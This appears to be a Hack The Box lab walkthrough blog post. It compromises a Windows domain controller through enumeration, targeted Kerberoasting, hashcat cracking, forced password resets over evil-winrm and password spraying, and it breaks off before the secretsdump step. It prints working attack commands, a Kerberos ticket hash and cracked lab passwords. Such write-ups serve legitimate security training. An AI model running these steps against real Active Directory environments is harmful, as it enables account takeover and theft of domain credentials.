---
title: Administrator
categories: [Walkthroughs,HackTheBox,Medium]
tags: [windows,Administrator,htb,hackthebox,Shadow Credentials,targeted kerberoasting]
description: In this walkthrough, we explore the Administrator machine on Hack The Box, demonstrating how common security misconfigurations can lead to significant vulnerabilities. By leveraging Kerberoasting, improper DACL permissions, and poor password management, we successfully escalated privileges and gained full control over the system. This exercise highlights the critical importance of regular security audits, proper account configuration, and the implementation of strong password practices in defending against real-world cyber threats.
image:
  path: https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png
  alt: Administrator machine logo from hack the box
---

## Summary

The **Administrator** machine on Hack The Box is an excellent example of how common misconfigurations can lead to severe security vulnerabilities. Through a combination of Kerberoasting, improper DACL permissions, and poor password management, I was able to escalate privileges and gain full control over the machine. This exercise reinforced the importance of regular security audits, proper account configuration, and strong password practices to defend against real-world threats.

|Machine|ReleaseDate|
|-------|-----------|
|Administrator|-------|

![Starter credentials](/assets/img/htb/administrator/htb-administrator-starter-cred.png)

## Reconnaissance

### Port scanning

I'll start by running an Nmap service and version scan with the default scripts. This will help identify any open ports and provide information about the services running on them, giving us valuable targets for further exploration.

```shell
┌──(frodo㉿kali)-[~/htb/administrator]
└─$ nmap -sC -sV -p- -Pn --min-rate 10000 -oA nmap_report 10.129.106.223

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 00:35 IST
Nmap scan report for 10.129.106.223
Host is up (0.091s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-10 02:06:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53886/tcp open  msrpc         Microsoft Windows RPC
55641/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55646/tcp open  msrpc         Microsoft Windows RPC
55649/tcp open  msrpc         Microsoft Windows RPC
55669/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-10T02:07:06
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.02 seconds
```

> Always save the Nmap output in a text file for future reference. This practice is invaluable, as repeatedly running Nmap can be time-consuming and unnecessary.
{: .prompt-tip }

After reviewing the Nmap scan results, we can confidently deduce that the target is a Domain Controller. This is evident from the presence of port 88/tcp, which is commonly associated with Kerberos authentication.

### FTP

Another interesting port is 21/tcp (FTP). However, attempts to log in using Olivia's account were unsuccessful.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ ftp olivia@10.129.106.223
Connected to 10.129.106.223.
220 Microsoft FTP Service
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> 
```

### SMB

Next, I checked if Olivia had access to any interesting SMB shares on the server, but found nothing of note.

```shell
┌──(frodo㉿kali)-[~/htb/administrator]
└─$ netexec smb 10.129.106.223 -u Olivia -p 'ichliebedich' --shares
SMB         10.129.106.223  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.106.223  445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.129.106.223  445    DC               [*] Enumerated shares
SMB         10.129.106.223  445    DC               Share           Permissions     Remark
SMB         10.129.106.223  445    DC               -----           -----------     ------
SMB         10.129.106.223  445    DC               ADMIN$                          Remote Admin
SMB         10.129.106.223  445    DC               C$                              Default share
SMB         10.129.106.223  445    DC               IPC$            READ            Remote IPC
SMB         10.129.106.223  445    DC               NETLOGON        READ            Logon server share
SMB         10.129.106.223  445    DC               SYSVOL          READ            Logon server share
```

### User Enumeration

Since I already have Olivia's credentials, I’ll use `netexec` to enumerate the users in the domain and save the list to a file for later use.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ netexec smb 10.129.106.223 -u olivia -p 'ichliebedich' --users                   
SMB         10.129.106.223  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.106.223  445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.129.106.223  445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-            
SMB         10.129.106.223  445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain
SMB         10.129.106.223  445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.106.223  445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account
SMB         10.129.106.223  445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.129.106.223  445    DC               michael                       2024-11-12 00:26:31 3        
SMB         10.129.106.223  445    DC               benjamin                      2024-11-12 00:31:20 3        
SMB         10.129.106.223  445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.129.106.223  445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.129.106.223  445    DC               alexander                     2024-10-31 00:18:04 3        
SMB         10.129.106.223  445    DC               emma                          2024-10-31 00:18:35 3        
SMB         10.129.106.223  445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
```

### Bloodhound

Next, I ran `bloodhound-python` to gather additional information on potential attack paths within the environment.

```shell
┌──(frodo㉿kali)-[~/htb/administrator]
└─$ bloodhound-python -d administrator.htb -c All -u Olivia -p 'ichliebedich' -ns 10.129.106.223 --zip
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 17S
INFO: Compressing output into 20241110005207_bloodhound.zip
```

#### Bloodhound Analysis

1. From the BloodHound graph, we can see that **Olivia** has the ability to perform `PSRemote` into the target. Additionally, under **First Degree Object Control**, **Olivia** has **GenericAll** privileges over **Michael**.

2. **Michael** has the ability to change **Benjamin's** password.
![Michael has the ability to change Benjamin's password.](/assets/img/htb/administrator/htb-administrator-bh1.png)

3. There is a user named **Ethan** who has `DCSync` privileges within the domain.

4. **Emily** has **GenericWrite** privileges on Ethan's account.
![Emily has `GenericWrite` privileges on Ethan's account](/assets/img/htb/administrator/htb-administrator-ethan.png)

> The **DCSync** attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the **Directory Replication Service Remote Protocol (MS-DRSR)**. Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
{: .prompt-info}

## Foothold

## Targetted Kerberoasting

`targetedKerberoast` is a Python script similar to other tools like `GetUserSPNs.py` that can extract kerberos hashes for user accounts with a Service Principal Name (SPN) set. What sets targetedKerberoast apart is its ability to go a step further: if a user doesn't have an SPN set, the script attempts to set one by exploiting write permissions on the servicePrincipalName attribute. It then retrieves the "Kerberos" hash and cleans up by deleting the temporary SPN it set for the operation. This technique is known as targeted Kerberoasting.

The tool can be run against all users in the domain, a specific list of users, or a single user specified via the command-line interface (CLI).

Let's clone the [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) repository and proceed.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 65, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 65 (delta 14), reused 12 (delta 12), pack-reused 43 (from 1)
Receiving objects: 100% (65/65), 238.08 KiB | 906.00 KiB/s, done.
Resolving deltas: 100% (25/25), done.
```

Using `targetedKerberoast.py`, I attempted to extract the Kerberos hash for Michael's account. However, the operation initially failed with the error: `KRB_AP_ERR_SKEW (Clock skew too great)`.

> Kerberos time skew is the maximum amount of time that the internal clocks of hosts in a Kerberos authentication system can be out of sync. The default value for clock skew is five minutes, or 300 seconds.
{: .prompt-info }

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ ./targetedKerberoast/targetedKerberoast.py --request-user michael -o michael_hash -d administrator.htb --dc-ip 10.129.106.223 -u Olivia -p ichliebedich 
[*] Starting kerberoast attacks
[*] Attacking user (michael)
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
To resolve the issue, I quickly synchronized my attacker's machine time with the target using `rdate`.
```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ sudo rdate -n administrator.htb
Tue Nov 12 05:37:36 IST 2024
```
After syncing the time, I was able to successfully retrieve the Kerberos hash for **Michael's** account using the targeted Kerberoasting attack.
```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ ./targetedKerberoast/targetedKerberoast.py --request-user michael -o michael_hash -d administrator.htb --dc-ip 10.129.106.223 -u Olivia -p 'ichliebedich'
[*] Starting kerberoast attacks
[*] Attacking user (michael)
[+] Writing hash to file for (michael)
```
## Password Cracking - 1
I attempted to crack the Kerberos hash using `hashcat` with the **rockyou** dictionary, but unfortunately, it wasn't successful.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ hashcat -a 0 -o cracked michael_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 4600H with Radeon Graphics, 2899/5862 MB (1024 MB allocatable), 2MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrato...a74937
Time.Started.....: Tue Nov 12 05:49:06 2024 (20 secs)
Time.Estimated...: Tue Nov 12 05:49:26 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   730.8 kH/s (0.89ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 83%

Started: Tue Nov 12 05:48:36 2024
Stopped: Tue Nov 12 05:49:28 2024
```

## Lateral Movement & Privilege Escalation

Since Olivia’s account has **GenericAll** privileges over Michael’s account, she can reset his password and then use it to initiate a WinRM session under his credentials.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ evil-winrm -i 10.129.106.223 -u Olivia -p 'ichliebedich'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> $password =  ConvertTo-SecureString "Welcome@123456" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\olivia\Documents> $password
System.Security.SecureString
*Evil-WinRM* PS C:\Users\olivia\Documents> Set-ADAccountPassword -Identity michael -NewPassword $password
*Evil-WinRM* PS C:\Users\olivia\Documents> 
```

Looking at the BloodHound graph, we see that Michael has the **ForceChangePassword** permission for **Benjamin's** account. Using the same method as before, I reset Benjamin's password.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ evil-winrm -i 10.129.106.223 -u michael -p 'Welcome@123456'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents>$password =  ConvertTo-SecureString "Welcome@123456" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-ADAccountPassword -Identity benjamin -NewPassword $password
*Evil-WinRM* PS C:\Users\michael\Documents> 
```

Since Benjamin's account isn’t a member of the **Remote Management Users** group, I couldn’t use it for a WinRM session. However, when I checked the `FTP` site, I found an interesting file named `Backup.psafe3`.

Fortunately, we can brute-force our way to the master password using `hashcat`.

> .psafe3 extension belongs to the databse format used by Password Safe, a password manager.
{ : .prompt-info }

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ ftp benjamin@10.129.106.223
Connected to 10.129.106.223.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||59258|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||59259|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************|   952       10.18 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (10.00 KiB/s)
ftp> binary
200 Type set to I.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||59262|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************|   952        9.76 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (9.71 KiB/s)
ftp> 


```

## Password Cracking - 2

I successfully cracked the master password using `hashcat` \
`Backup.psafe3:tekieromucho`
```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ hashcat -a 0 -m 5200 -o cracked Backup.psafe3 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 4600H with Radeon Graphics, 2899/5862 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

ATTENTION! Potfile storage is disabled for this hash mode.
Passwords cracked during this session will NOT be stored to the potfile.
Consider using -o to save cracked passwords.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Tue Nov 12 06:10:32 2024 (0 secs)
Time.Estimated...: Tue Nov 12 06:10:32 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10494 H/s (7.64ms) @ Accel:128 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4864/14344385 (0.03%)
Rejected.........: 0/4864 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -> denis
Hardware.Mon.#1..: Util: 65%

Started: Tue Nov 12 06:10:30 2024
Stopped: Tue Nov 12 06:10:34 2024
                                                                    
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ cat cracked     
Backup.psafe3:tekieromucho
```
Next, I installed [Password Safe](https://pwsafe.org/) on my Windows machine and used the master password to open the Backup.psafe3 database.

Inside the database, I discovered the following usernames and their corresponding passwords:
1. alexander - UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
2. emily - UXLCI5iETUsIBoFVTj8yQFKoHjXmb
3. emma - WwANQWnmJnGV07WQN8bMS7FMAbjNur

## Password Spraying
I performed a password spraying attack on all the user accounts, and it was successful for the user **emily**.
```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ netexec smb 10.129.106.223 -u users  -p passwords --continue-on-success 
SMB         10.129.106.223  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.106.223  445    DC               [-] administrator.htb\olivia:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\michael:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\benjamin:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\ethan:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.129.106.223  445    DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\olivia:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\michael:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\benjamin:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
SMB         10.129.106.223  445    DC               [-] administrator.htb\ethan:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\emma:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\olivia:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\michael:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\benjamin:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\ethan:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE 
SMB         10.129.106.223  445    DC               [-] administrator.htb\alexander:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
SMB         10.129.106.223  445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE 
```
This is good news. `Emily` has GenericWrite privileges on Ethan's account, and Ethan has `DCSync` rights

> With **GenericWrite** over a user, we can write to the “msds-KeyCredentialLink” attribute. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using Kerberos PKINIT.
Alternatively, we can write to the "servicePrincipalNames" attribute and perform a targeted kerberoasting attack. 
{: .prompt-info}

I was able to get the hash for ethan's account using **targeted kerberoasting attack**.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ ./targetedKerberoast/targetedKerberoast.py --request-user ethan -o ethan_hash -d administrator.htb --dc-ip 10.129.106.223 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Attacking user (ethan)
[+] Writing hash to file for (ethan)

┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ cat ethan_hash        
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$6069f5604ca98b28452515c62f0f5f33$df0b8f90c420cf01cd8308e03ebba6e3dbd3935084f015f5ca487d3fe0f1a042bbee88935e22d24721f09da981c523a121c1ddfdb898cfc022e253765e631de36509b1b5a482f34e9a7d9c52f5fd22bcd1072619d2bead020f241b01450724349b43fc6129e1b47f311fc4acf612cbaa3018fc3f532972fe70003ba9e0a4033485b3e1a50d0bedc34c8d3929c7c7a300175e1d0a27d40429998a735dca4a696a797c2a580da8dd9d17930b8eb4cec611a6c2ceb479f206834ee132c89a5dd312d4e9570312597831191313af83262b0298d6ebd03c68e289e47b55ea2f31dd23cb974531ef11dba38ad70f0f2cd36800ae96da442f55ad143a58f395505c6c620b34b8ebea73a98b63996b17ab140495edb67d6987ac085008a35bc15c018f6a025f0cd20d76ab56df4b758f5fce0977f714853126391ec9bd775abdcc8d2cbc473d98c846aee70cc7fa71f8e7feb983c724ae1414bcae62c23ac6f330d3a03fa533efc9e9b3a67909272c5f6bdda0855aba5976581f4ddfdbfa50882cd04519156679d66d70346a9f975e7a91f072a50d117ffa322ac73c4dbfb1c6d8a1dccce2509a5efcc0c4fd2cc7c1701c4dab4d92f404b93542b929b8288a4fb461266aaa0bde66b79cf69bfdb8585086faf2992110c5f720285a42c2b5ee7b0bf742562e6a50662180c0671b970e7b575c89bc7322bbd714f1076e6eab0703ddf3818b2a1fd61a2d1462b494ed2757243d3f52665f30af5a046df744832ca39ac89e2e13794918b0b324b3181daea14b243928b69a9cdb1515045240097654db77def69ecfdd9d2c1434024923edb11521bbfa8f8302bdcbb181bf2ae321dc312e7c694d7f5bdd87f54161b42b2a81de6cfbfdd57a3318017a7c979e3b33e967d5d550c8fb7b63b2a8a66deb79a74c815a29cf46f217b14a6fdfe5fde9b94759418e00ba040557802d35a7419899a53ebb44e0e4e7b9228c3e413ce30ca04dbdf82bfb1ad32d45718b65e82634a2c88cddff12f6dafb03896ace6dad0ec621bd72475457eae6b1db903529f2de0e73930a62b516ff3f9dc8a4fce07f8307c42e6afaed770dd2afe77cfc106384cb52ba484bbbb815daf3d6bbb0f8b0cb515aca01c96cba55345a247cc5f86ddd72d0189201b71a7a0305a961f34c396b1a9242a52caec3919d58578ec111ad253d3b965de7c44645cdcade0ab5688290efa417d6583bccbd276a67fa4bad11b8405bfdc3129fcc75c20d73d756ee68fa3f4e742bf9f823f7fb07372dcf74380b39336b95b2ced6b6bea5eea5f2a05405292ba54514fca13b7c51523785d77465ab9ce2e28b410cce7f04749c84fb0b6aefe82ee2367145bb1936c6b2f6b4a6f66f6c98ef16a85867741dff9d7053f98daeb3a0bb2faac7729d6d88d1db3d2ba22c25323456795096675e6e4c0672717fbb51f5f2016fd8c17c84891758d6459dcf102d8b9305ef6adeceb0c3b7d662a871ba61165caaf060a12673feab77b31123a11b1863677c1475ced12494bef4c2bbba1d5841
```

## Password Cracking - 3

Next, I used `hashcat` and the `rockyou` dictionary to crack Ethan's password.
```shell
┌──(frodo㉿kali)-[~/hack-the-box/administrator]
└─$ hashcat -a 0 -m 13100 -o ethan_cracked ethan_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 5 4600H with Radeon Graphics, 2899/5862 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....1d5841
Time.Started.....: Tue Nov 12 06:36:16 2024 (0 secs)
Time.Estimated...: Tue Nov 12 06:36:16 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   565.7 kH/s (0.96ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5120/14344385 (0.04%)
Rejected.........: 0/5120 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> babygrl
Hardware.Mon.#1..: Util: 56%

Started: Tue Nov 12 06:36:15 2024
Stopped: Tue Nov 12 06:36:18 2024
```

The password for Ethan is `limpbizkit`. With this, I can now extract the complete `NTDS.dit` secrets using Impacket’s `secretsdump.py` script.

>NTDS.DIT stands for New Technology Directory Services Directory Information Tree. It serves as the primary database file within Microsoft’s Active Directory Domain Services (AD DS). Essentially, NTDS.DIT stores and organizes all the information related to objects in the domain, including users, groups, computers, and more. It acts as the backbone of Active Directory, housing critical data such as user account details, passwords, group memberships, and other object attributes.
{: .prompt-info}

```shell
